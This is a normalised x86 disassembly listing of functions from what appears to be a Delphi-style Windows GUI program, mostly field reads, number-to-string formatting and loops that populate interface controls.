sub_40a08c
push ebx
mov ebx eax
mov eax [ ebx + 0x44c ]
mov edx [ eax ]
call [ edx + 0xdc ]
push eax
mov ecx [ rw-data ]
push ecx
call sub_41372c
add esp 0x8
test al al
je r-xdata
pop ebx
retn
mov eax ebx
call sub_40a024
sub_40a0bc
push ebx
mov ebx eax
mov eax [ ebx + 0x44c ]
mov edx [ eax ]
call [ edx + 0xdc ]
push eax
mov ecx [ rw-data ]
push ecx
call sub_41445c
add esp 0x8
test al al
je r-xdata
pop ebx
retn
mov eax ebx
call sub_40a024
sub_40a0ec
push ebx
mov ebx eax
mov eax [ ebx + 0x44c ]
mov edx [ eax ]
call [ edx + 0xdc ]
push eax
mov ecx [ rw-data ]
push ecx
call sub_414ea0
add esp 0x8
test al al
je r-xdata
pop ebx
retn
mov eax ebx
call sub_40a024
sub_40a140
push ebx
mov ebx eax
push 0x0
mov eax [ ebx + 0x44c ]
mov edx [ eax ]
call [ edx + 0xdc ]
push eax
mov ecx [ rw-data ]
push ecx
call sub_412c58
add esp 0xc
pop ebx
retn
sub_40a168
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov ebx eax
movsx eax cl
dec eax
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov edx [ ebp + 0xc ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x10 ]
mov cl 0x1
mov eax [ ebx + 0x44c ]
call sub_46035c
test eax eax
jge r-xdata
push 0x0
push eax
mov ecx [ rw-data ]
push ecx
call sub_412c58
add esp 0xc
mov esi [ ebx + 0x44c ]
add esi 0x270
mov eax [ esi ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
sub_40a1d0
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov [ ebp - 0x34 ] eax
mov eax rw-data
call sub_4c517c
mov edx [ ebp - 0x34 ]
mov esi [ edx + 0x3cc ]
jmp r-xdata
mov edx [ ebp - 0x34 ]
mov eax [ edx + 0x3a0 ]
xor edx edx
mov eax [ eax + 0x34 ]
call sub_466094
mov edi eax
cmp esi eax
jne r-xdata
mov eax [ ebp - 0x34 ]
mov edx [ eax + 0x3a0 ]
mov eax [ edx + 0x34 ]
xor edx edx
call sub_4662cc
mov ebx edi
mov [ ebp - 0x8 ] ebx
test ebx ebx
je r-xdata
mov edx [ rw-data ]
mov ecx [ edx ]
mov [ ebp - 0x38 ] ecx
xor esi esi
jmp r-xdata
mov eax [ ebx ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x20 ] 0x24
mov edx 0x3
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov [ ebp - 0x20 ] 0xc
mov eax [ ebp - 0x38 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp esi eax
jl r-xdata
mov eax [ ebp - 0x34 ]
mov ecx [ eax + 0x3a0 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_462d48
mov [ ebp - 0x20 ] 0x30
mov ebx eax
xor eax eax
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0xc ]
inc [ ebp - 0x14 ]
mov edx esi
mov eax [ ebp - 0x38 ]
mov edi [ eax ]
call [ edi + 0xc ]
lea edx [ ebp - 0xc ]
mov eax ebx
mov edx [ edx ]
call sub_465ee8
dec [ ebp - 0x14 ]
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_4d318c
mov [ ebx + 0x88 ] r-xdata
mov ecx [ ebp - 0x34 ]
mov [ ebx + 0x8c ] ecx
mov [ ebx + 0xc ] esi
mov eax [ rw-data ]
mov edx [ eax + 0x4 ]
cmp esi edx
jne r-xdata
mov ecx [ ebp - 0x30 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x34 ]
mov edx esi
mov eax [ ecx + 0x3a0 ]
mov ecx ebx
mov eax [ eax + 0x34 ]
call sub_466210
inc esi
mov dl 0x1
mov eax ebx
call sub_465f5c
sub_40a340
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x38 ] edx
mov [ ebp - 0x34 ] eax
mov eax rw-data
call sub_4c517c
xor esi esi
mov eax [ ebp - 0x3c ]
cmp esi eax
jge r-xdata
mov ecx [ ebp - 0x30 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp - 0x34 ]
mov ecx [ edx + 0x3dc ]
mov eax [ ecx + 0x28c ]
call sub_4a8150
mov [ ebp - 0x20 ] 0xc
mov ebx eax
mov eax [ ebp - 0x38 ]
mov edx [ eax ]
lea eax [ ebp - 0x4 ]
call sub_4d3128
inc [ ebp - 0x14 ]
mov edx [ eax ]
mov eax ebx
call sub_4a7bcc
dec [ ebp - 0x14 ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x20 ] 0x18
lea edi [ ebx + 0x8 ]
mov edx rw-data
lea eax [ ebp - 0x8 ]
call sub_4d3010
inc [ ebp - 0x14 ]
mov edx [ eax ]
mov eax [ edi ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
dec [ ebp - 0x14 ]
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x20 ] 0x24
lea edi [ ebx + 0x8 ]
mov edx rw-data
lea eax [ ebp - 0xc ]
call sub_4d3010
inc [ ebp - 0x14 ]
mov edx [ eax ]
mov eax [ edi ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
dec [ ebp - 0x14 ]
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_4d318c
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4a7c80
mov ecx [ ebp + 0x8 ]
shl ecx 0x2
add [ ebp - 0x38 ] ecx
mov eax [ ebp + 0x8 ]
add [ ebp + 0xc ] eax
inc esi
mov edx [ ebp - 0x3c ]
cmp esi edx
jl r-xdata
sub_40a44c
push ebp
mov ebp esp
add esp 0xfffffeb0
push ebx
push esi
push edi
mov ebx eax
mov eax rw-data
call sub_4c517c
mov edx [ rw-data ]
mov esi [ edx + 0x8 ]
mov eax [ esi + 0x4 ]
cmp eax 0x10
jle r-xdata
mov edx [ esi + 0x4 ]
dec edx
jge r-xdata
mov [ esi + 0x4 ] 0x10
xor edx edx
mov eax [ ebx + 0x3d8 ]
call sub_48deb0
mov eax [ ebx + 0x3d8 ]
call sub_4a4d24
mov edx [ eax ]
call [ edx + 0x44 ]
xor ecx ecx
mov [ ebp - 0x6c ] ecx
jmp r-xdata
mov [ esi + 0x4 ] 0x1
mov ecx [ esi + 0x4 ]
mov eax [ ebp - 0x6c ]
cmp ecx eax
jg r-xdata
mov eax [ ebx + 0x3d8 ]
call sub_4a4d24
mov [ ebp - 0x58 ] 0xc
mov edi eax
mov eax [ ebp - 0x6c ]
inc eax
xor edx edx
mov [ ebp - 0x70 ] eax
mov [ ebp - 0x4 ] edx
inc [ ebp - 0x4c ]
lea eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x70 ]
push ecx
push rw-data
push eax
call sub_402d3c
add esp 0xc
lea edx [ ebp - 0x4 ]
inc [ ebp - 0x4c ]
xor ecx ecx
mov [ ebp - 0x8 ] ecx
inc [ ebp - 0x4c ]
lea ecx [ ebp - 0x8 ]
inc [ ebp - 0x4c ]
mov eax rw-data
call sub_402d5c
xor edx edx
mov [ ebp - 0xc ] edx
lea edx [ ebp - 0x8 ]
lea eax [ ebp - 0xc ]
call sub_41e604
lea ecx [ ebp - 0xc ]
inc [ ebp - 0x4c ]
mov edx [ ecx ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
dec [ ebp - 0x4c ]
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x4c ]
dec [ ebp - 0x4c ]
lea eax [ ebp - 0x8 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x4c ]
dec [ ebp - 0x4c ]
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4d2728
inc [ ebp - 0x6c ]
mov edx [ ebx + 0x3dc ]
mov eax [ edx + 0x28c ]
call sub_4a82d8
mov edx [ esi + 0x1a908 ]
cmp edx 0x3
jne r-xdata
mov eax [ esi + 0x1a908 ]
cmp eax 0x2
jne r-xdata
push esi
mov esi rw-data
lea edi [ ebp - 0x100 ]
mov ecx 0x14
[ edi ] [ esi ]
pop esi
mov [ ebp - 0x58 ] 0x18
push 0x0
push 0x1
lea edx [ ebp - 0x100 ]
mov ecx 0x10
mov eax ebx
call sub_40a340
mov [ ebp - 0x58 ] 0x0
jmp r-xdata
push esi
mov esi rw-data
lea edi [ ebp - 0x110 ]
mov ecx 0x4
[ edi ] [ esi ]
pop esi
mov [ ebp - 0x58 ] 0x3c
push 0x0
push 0x1
lea edx [ ebp - 0x110 ]
mov ecx 0x4
mov eax ebx
call sub_40a340
mov [ ebp - 0x58 ] 0x24
push esi
lea edi [ ebp - 0x88 ]
mov esi rw-data
mov ecx 0x6
[ edi ] [ esi ]
pop esi
mov eax [ rw-data ]
mov [ ebp - 0x58 ] 0x24
mov [ ebp - 0x90 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x8c ] eax
mov eax ebx
mov [ ebp - 0x58 ] 0x30
push 0x0
push 0x1
mov ecx 0x6
lea edx [ ebp - 0x88 ]
call sub_40a340
push 0xa
push 0x1
lea edx [ ebp - 0x90 ]
mov ecx 0x2
mov eax ebx
call sub_40a340
mov [ ebp - 0x58 ] 0x0
jmp r-xdata
mov al [ esi + 0x1a90c ]
test al al
je r-xdata
mov eax [ esi + 0x1a908 ]
test eax eax
je r-xdata
push esi
mov esi rw-data
lea edi [ ebp - 0xa0 ]
mov ecx 0x4
[ edi ] [ esi ]
pop esi
mov [ ebp - 0x58 ] 0x48
push 0x20
push 0x1
lea edx [ ebp - 0xa0 ]
mov ecx 0x4
mov eax ebx
call sub_40a340
mov [ ebp - 0x58 ] 0x24
mov [ ebp - 0x58 ] 0x0
xor edx edx
mov [ ebp - 0xa4 ] edx
mov [ ebp - 0x58 ] 0x24
mov ecx [ ebp - 0xa4 ]
cmp ecx 0x20
jge r-xdata
push esi
mov esi rw-data
lea edi [ ebp - 0x150 ]
mov ecx 0x10
[ edi ] [ esi ]
pop esi
mov [ ebp - 0x58 ] 0x54
mov eax [ esi + 0x1a908 ]
cmp eax 0x3
jne r-xdata
mov [ ebp - 0x58 ] 0x24
xor edi edi
jmp r-xdata
mov eax [ ebx + 0x3dc ]
mov eax [ eax + 0x28c ]
call sub_4a8150
mov [ ebp - 0x58 ] 0x24
mov [ ebp - 0x58 ] 0x60
mov edi eax
mov eax [ ebp - 0xa4 ]
inc eax
xor edx edx
mov [ ebp - 0xa8 ] eax
mov [ ebp - 0x10 ] edx
inc [ ebp - 0x4c ]
lea eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xa8 ]
push ecx
push rw-data
push eax
call sub_402d3c
add esp 0xc
lea edx [ ebp - 0x10 ]
inc [ ebp - 0x4c ]
xor ecx ecx
mov [ ebp - 0x14 ] ecx
inc [ ebp - 0x4c ]
lea ecx [ ebp - 0x14 ]
inc [ ebp - 0x4c ]
mov eax rw-data
call sub_402d5c
xor edx edx
mov [ ebp - 0x18 ] edx
lea edx [ ebp - 0x14 ]
lea eax [ ebp - 0x18 ]
call sub_41e604
lea ecx [ ebp - 0x18 ]
mov eax edi
inc [ ebp - 0x4c ]
mov edx [ ecx ]
call sub_4a7bcc
dec [ ebp - 0x4c ]
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x4c ]
dec [ ebp - 0x4c ]
lea eax [ ebp - 0x14 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x4c ]
dec [ ebp - 0x4c ]
lea eax [ ebp - 0x10 ]
xor edx edx
call sub_4d2728
lea ecx [ edi + 0x8 ]
mov edx rw-data
mov [ ebp - 0xac ] ecx
lea eax [ ebp - 0x1c ]
mov [ ebp - 0x58 ] 0x6c
call sub_4d3010
inc [ ebp - 0x4c ]
mov edx [ eax ]
mov eax [ ebp - 0xac ]
mov eax [ eax ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
dec [ ebp - 0x4c ]
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_4d318c
lea ecx [ edi + 0x8 ]
mov edx rw-data
mov [ ebp - 0xb0 ] ecx
lea eax [ ebp - 0x20 ]
mov [ ebp - 0x58 ] 0x78
call sub_4d3010
inc [ ebp - 0x4c ]
mov edx [ eax ]
mov eax [ ebp - 0xb0 ]
mov eax [ eax ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
dec [ ebp - 0x4c ]
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_4d318c
mov edx [ ebp - 0xa4 ]
mov eax edi
add edx 0x24
call sub_4a7c80
inc [ ebp - 0xa4 ]
mov ecx [ ebp - 0xa4 ]
cmp ecx 0x20
jl r-xdata
mov al [ esi + 0x1a90d ]
test al al
je r-xdata
mov dl [ esi + 0x1a90d ]
test dl dl
je r-xdata
mov ecx [ ebx + 0x3dc ]
mov eax [ ecx + 0x28c ]
call sub_4a81b8
cmp edi eax
jl r-xdata
push 0x10
push 0x2
lea edx [ ebp - 0x150 ]
mov ecx 0x4
mov eax ebx
call sub_40a340
push 0x10
push 0x1
lea edx [ ebp - 0x150 ]
mov ecx 0x8
mov eax ebx
call sub_40a340
jmp r-xdata
push 0x10
push 0x2
lea edx [ ebp - 0x150 ]
mov ecx 0x8
mov eax ebx
call sub_40a340
jmp r-xdata
push 0x10
push 0x1
lea edx [ ebp - 0x150 ]
mov ecx 0x10
mov eax ebx
call sub_40a340
jmp r-xdata
mov eax [ ebx + 0x3dc ]
mov edx edi
mov eax [ eax + 0x28c ]
call sub_4a81f0
mov edx eax
mov eax ebx
call sub_40ab9c
inc edi
mov edi [ ebx + 0x3dc ]
xor edx edx
mov eax [ edi + 0x28c ]
call sub_4a81f0
mov edx eax
mov eax edi
call sub_4ac550
mov dl 0x1
mov eax [ ebx + 0x3d8 ]
call sub_48deb0
mov [ ebp - 0x58 ] 0x84
mov edi [ esi + 0x4 ]
xor ecx ecx
mov [ ebp - 0x24 ] ecx
push edi
push rw-data
lea eax [ ebp - 0x24 ]
push eax
call sub_4d3324
add esp 0xc
lea edx [ ebp - 0x24 ]
inc [ ebp - 0x4c ]
mov edx [ edx ]
mov eax [ ebx + 0x3f0 ]
call sub_48dfa0
dec [ ebp - 0x4c ]
lea eax [ ebp - 0x24 ]
mov edx 0x2
call sub_4d318c
mov edx [ esi + 0x1a908 ]
mov eax [ ebx + 0x490 ]
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov dl [ esi + 0x1a90c ]
mov eax [ ebx + 0x408 ]
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov dl [ esi + 0x1a90d ]
mov eax [ ebx + 0x494 ]
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov eax [ esi + 0x1a910 ]
mov ecx 0xa
cdq
idiv ecx
mov edx eax
mov eax [ ebx + 0x3f4 ]
call sub_4a6714
mov [ ebp - 0x58 ] 0x90
mov edx rw-data
lea eax [ ebp - 0x2c ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0x4c ]
inc [ ebp - 0x4c ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ esi + 0x1a910 ]
mov ecx 0xa
cdq
idiv ecx
mov edi eax
xor eax eax
mov [ ebp - 0x28 ] eax
inc [ ebp - 0x4c ]
push edi
push rw-data
lea edx [ ebp - 0x28 ]
push edx
call sub_402d3c
add esp 0xc
lea eax [ ebp - 0x28 ]
inc [ ebp - 0x4c ]
xor edx edx
mov [ ebp - 0x30 ] edx
inc [ ebp - 0x4c ]
lea ecx [ ebp - 0x30 ]
inc [ ebp - 0x4c ]
pop edx
call sub_402e08
xor eax eax
mov [ ebp - 0x34 ] eax
lea edx [ ebp - 0x30 ]
lea eax [ ebp - 0x34 ]
call sub_41e604
lea ecx [ ebp - 0x34 ]
inc [ ebp - 0x4c ]
mov edx [ ecx ]
mov eax [ ebx + 0x3f8 ]
call sub_48dfa0
dec [ ebp - 0x4c ]
lea eax [ ebp - 0x34 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x4c ]
dec [ ebp - 0x4c ]
lea eax [ ebp - 0x30 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x4c ]
dec [ ebp - 0x4c ]
lea eax [ ebp - 0x2c ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x4c ]
dec [ ebp - 0x4c ]
lea eax [ ebp - 0x28 ]
xor edx edx
call sub_4d2728
mov eax [ esi + 0x1a914 ]
mov ecx 0xa
cdq
idiv ecx
mov edx eax
mov eax [ ebx + 0x484 ]
call sub_4a6714
mov [ ebp - 0x58 ] 0x9c
mov edx rw-data
lea eax [ ebp - 0x3c ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0x4c ]
inc [ ebp - 0x4c ]
lea eax [ ebp - 0x3c ]
push eax
mov eax [ esi + 0x1a914 ]
mov ecx 0xa
cdq
idiv ecx
mov edi eax
xor eax eax
mov [ ebp - 0x38 ] eax
inc [ ebp - 0x4c ]
push edi
push rw-data
lea edx [ ebp - 0x38 ]
push edx
call sub_402d3c
add esp 0xc
lea eax [ ebp - 0x38 ]
inc [ ebp - 0x4c ]
xor edx edx
mov [ ebp - 0x40 ] edx
inc [ ebp - 0x4c ]
lea ecx [ ebp - 0x40 ]
inc [ ebp - 0x4c ]
pop edx
call sub_402e08
xor eax eax
mov [ ebp - 0x44 ] eax
lea edx [ ebp - 0x40 ]
lea eax [ ebp - 0x44 ]
call sub_41e604
lea ecx [ ebp - 0x44 ]
inc [ ebp - 0x4c ]
mov edx [ ecx ]
mov eax [ ebx + 0x480 ]
call sub_48dfa0
dec [ ebp - 0x4c ]
lea eax [ ebp - 0x44 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x4c ]
dec [ ebp - 0x4c ]
lea eax [ ebp - 0x40 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x4c ]
dec [ ebp - 0x4c ]
lea eax [ ebp - 0x3c ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x4c ]
dec [ ebp - 0x4c ]
lea eax [ ebp - 0x38 ]
xor edx edx
call sub_4d2728
mov edx [ esi + 0x1a918 ]
mov eax [ ebx + 0x418 ]
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov eax [ ebp - 0x68 ]
mov [ fs : 0x0 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x58 ] 0x24
sub_40ab9c
push ebp
mov ebp esp
add esp 0xfffffeb0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax rw-data
call sub_4c517c
mov edx [ rw-data ]
mov eax [ ebx + 0x3d8 ]
mov edi [ edx + 0x8 ]
call sub_4a42d8
imul eax eax 0x1a90
mov ebx [ esi + 0x28 ]
add eax edi
shl ebx 0x2
add eax 0x8
lea ebx [ ebx + ebx * 4 ]
lea ebx [ ebx + ebx * 4 ]
add ebx eax
mov eax ebx
call sub_40d804
mov edx [ ebx ]
cmp edx 0x6
ja r-xdata
mov ecx [ ebp - 0x114 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_40abfc ]
mov [ ebp - 0x104 ] 0xc
lea ebx [ esi + 0x8 ]
mov edx rw-data
mov edi ebx
lea eax [ ebp - 0x4 ]
call sub_4d3010
inc [ ebp - 0xf8 ]
mov ecx [ eax ]
mov eax [ edi ]
xor edx edx
mov edi [ eax ]
call [ edi + 0x20 ]
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x104 ] 0x18
mov edx rw-data
lea eax [ ebp - 0x8 ]
call sub_4d3010
inc [ ebp - 0xf8 ]
mov ecx [ eax ]
mov eax [ ebx ]
mov edx 0x1
mov ebx [ eax ]
call [ ebx + 0x20 ]
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4d318c
jmp r-xdata
mov [ ebp - 0x104 ] 0x30
mov ecx [ ebx + 0xc ]
push ecx
call sub_40d614
pop ecx
lea edx [ ebp - 0xc ]
mov ecx edx
xor edx edx
xchg ecx eax
xchg ecx edx
call sub_4d25d8
inc [ ebp - 0xf8 ]
inc [ ebp - 0xf8 ]
mov [ ebp - 0x104 ] 0x24
mov [ ebp - 0x118 ] 0x1
lea edi [ ebx + 0x10 ]
jmp r-xdata
mov [ ebp - 0x104 ] 0x84
mov edx rw-data
lea eax [ ebp - 0x3c ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0xf8 ]
inc [ ebp - 0xf8 ]
mov [ ebp - 0x104 ] 0x78
mov eax [ ebx + 0x1c ]
test eax eax
jle r-xdata
lea edi [ esi + 0x8 ]
mov [ ebp - 0x104 ] 0x120
mov edx rw-data
lea eax [ ebp - 0xb8 ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0xf8 ]
inc [ ebp - 0xf8 ]
lea eax [ ebp - 0xb8 ]
push eax
xor ecx ecx
mov edx [ ebx + 0x38 ]
mov [ ebp - 0x14c ] edx
mov [ ebp - 0xb0 ] ecx
inc [ ebp - 0xf8 ]
lea edx [ ebp - 0xb0 ]
mov eax [ ebp - 0x14c ]
push eax
push rw-data
push edx
call sub_402d3c
add esp 0xc
lea edx [ ebp - 0xb0 ]
inc [ ebp - 0xf8 ]
xor eax eax
mov [ ebp - 0xb4 ] eax
inc [ ebp - 0xf8 ]
lea ecx [ ebp - 0xb4 ]
inc [ ebp - 0xf8 ]
mov eax rw-data
call sub_402d5c
lea eax [ ebp - 0xb4 ]
xor edx edx
mov [ ebp - 0xbc ] edx
inc [ ebp - 0xf8 ]
lea ecx [ ebp - 0xbc ]
inc [ ebp - 0xf8 ]
pop edx
call sub_402e08
xor eax eax
mov [ ebp - 0xc0 ] eax
lea edx [ ebp - 0xbc ]
lea eax [ ebp - 0xc0 ]
call sub_41e604
inc [ ebp - 0xf8 ]
lea ecx [ ebp - 0xc0 ]
mov eax [ edi ]
xor edx edx
mov ecx [ ecx ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0xc0 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xf8 ]
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0xbc ]
xor edx edx
call sub_4d2728
dec [ ebp - 0xf8 ]
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0xb8 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0xf8 ]
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0xb4 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0xf8 ]
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0xb0 ]
xor edx edx
call sub_4d2728
mov [ ebp - 0x104 ] 0x12c
lea ebx [ esi + 0x8 ]
mov edx rw-data
lea eax [ ebp - 0xc4 ]
call sub_4d3010
inc [ ebp - 0xf8 ]
mov ecx [ eax ]
mov eax [ ebx ]
mov edx 0x1
mov ebx [ eax ]
call [ ebx + 0x20 ]
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0xc4 ]
mov edx 0x2
call sub_4d318c
jmp r-xdata
lea edi [ esi + 0x8 ]
mov [ ebp - 0x104 ] 0x138
mov edx rw-data
lea eax [ ebp - 0xd0 ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0xf8 ]
inc [ ebp - 0xf8 ]
lea eax [ ebp - 0xd0 ]
push eax
xor ecx ecx
mov edx [ ebx + 0x38 ]
inc edx
mov [ ebp - 0x150 ] edx
mov [ ebp - 0xc8 ] ecx
inc [ ebp - 0xf8 ]
lea edx [ ebp - 0xc8 ]
mov eax [ ebp - 0x150 ]
push eax
push rw-data
push edx
call sub_402d3c
add esp 0xc
lea edx [ ebp - 0xc8 ]
inc [ ebp - 0xf8 ]
xor eax eax
mov [ ebp - 0xcc ] eax
inc [ ebp - 0xf8 ]
lea ecx [ ebp - 0xcc ]
inc [ ebp - 0xf8 ]
mov eax rw-data
call sub_402d5c
lea eax [ ebp - 0xcc ]
xor edx edx
mov [ ebp - 0xd4 ] edx
inc [ ebp - 0xf8 ]
lea ecx [ ebp - 0xd4 ]
inc [ ebp - 0xf8 ]
pop edx
call sub_402e08
xor eax eax
mov [ ebp - 0xd8 ] eax
lea edx [ ebp - 0xd4 ]
lea eax [ ebp - 0xd8 ]
call sub_41e604
inc [ ebp - 0xf8 ]
lea ecx [ ebp - 0xd8 ]
mov eax [ edi ]
xor edx edx
mov ecx [ ecx ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0xd8 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xf8 ]
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0xd4 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0xf8 ]
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0xd0 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0xf8 ]
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0xcc ]
xor edx edx
call sub_4d2728
dec [ ebp - 0xf8 ]
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0xc8 ]
xor edx edx
call sub_4d2728
mov [ ebp - 0x104 ] 0x144
lea ebx [ esi + 0x8 ]
mov edx rw-data
lea eax [ ebp - 0xdc ]
call sub_4d3010
inc [ ebp - 0xf8 ]
mov ecx [ eax ]
mov eax [ ebx ]
mov edx 0x1
mov ebx [ eax ]
call [ ebx + 0x20 ]
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0xdc ]
mov edx 0x2
call sub_4d318c
jmp r-xdata
lea edi [ esi + 0x8 ]
mov [ ebp - 0x104 ] 0x150
mov edx rw-data
lea eax [ ebp - 0xe4 ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0xf8 ]
inc [ ebp - 0xf8 ]
lea eax [ ebp - 0xe4 ]
push eax
xor edx edx
mov [ ebp - 0xe0 ] edx
inc [ ebp - 0xf8 ]
lea ecx [ ebp - 0xe0 ]
inc [ ebp - 0xf8 ]
lea edx [ ebx + 0x3c ]
mov eax rw-data
call sub_402d5c
lea eax [ ebp - 0xe0 ]
xor edx edx
mov [ ebp - 0xe8 ] edx
inc [ ebp - 0xf8 ]
lea ecx [ ebp - 0xe8 ]
inc [ ebp - 0xf8 ]
pop edx
call sub_402e08
xor eax eax
mov [ ebp - 0xec ] eax
lea edx [ ebp - 0xe8 ]
lea eax [ ebp - 0xec ]
call sub_41e604
inc [ ebp - 0xf8 ]
lea ecx [ ebp - 0xec ]
mov eax [ edi ]
xor edx edx
mov ecx [ ecx ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0xec ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xf8 ]
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0xe8 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0xf8 ]
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0xe4 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0xf8 ]
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0xe0 ]
xor edx edx
call sub_4d2728
mov [ ebp - 0x104 ] 0x15c
lea ebx [ esi + 0x8 ]
mov edx rw-data
lea eax [ ebp - 0xf0 ]
call sub_4d3010
inc [ ebp - 0xf8 ]
mov ecx [ eax ]
mov eax [ ebx ]
mov edx 0x1
mov ebx [ eax ]
call [ ebx + 0x20 ]
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0xf0 ]
mov edx 0x2
call sub_4d318c
mov ecx [ ebp - 0x118 ]
cmp ecx 0x3
jge r-xdata
mov ecx [ ebx + 0x1c ]
test ecx ecx
jge r-xdata
mov [ ebp - 0x104 ] 0x90
mov edx rw-data
lea eax [ ebp - 0x48 ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0xf8 ]
inc [ ebp - 0xf8 ]
lea edx [ ebp - 0x48 ]
push edx
xor edx edx
mov eax [ ebx + 0x1c ]
mov [ ebp - 0x128 ] eax
mov [ ebp - 0x40 ] edx
inc [ ebp - 0xf8 ]
lea eax [ ebp - 0x40 ]
mov ecx [ ebp - 0x128 ]
push ecx
push rw-data
push eax
call sub_402d3c
add esp 0xc
lea edx [ ebp - 0x40 ]
inc [ ebp - 0xf8 ]
xor ecx ecx
mov [ ebp - 0x44 ] ecx
inc [ ebp - 0xf8 ]
lea ecx [ ebp - 0x44 ]
inc [ ebp - 0xf8 ]
mov eax rw-data
call sub_402d5c
lea eax [ ebp - 0x44 ]
xor edx edx
mov [ ebp - 0x4c ] edx
inc [ ebp - 0xf8 ]
lea ecx [ ebp - 0x4c ]
inc [ ebp - 0xf8 ]
pop edx
call sub_402e08
lea edx [ ebp - 0x4c ]
lea eax [ ebp - 0x3c ]
call sub_4d276c
dec [ ebp - 0xf8 ]
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0x4c ]
xor edx edx
call sub_4d2728
dec [ ebp - 0xf8 ]
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0x48 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0xf8 ]
dec [ ebp - 0xf8 ]
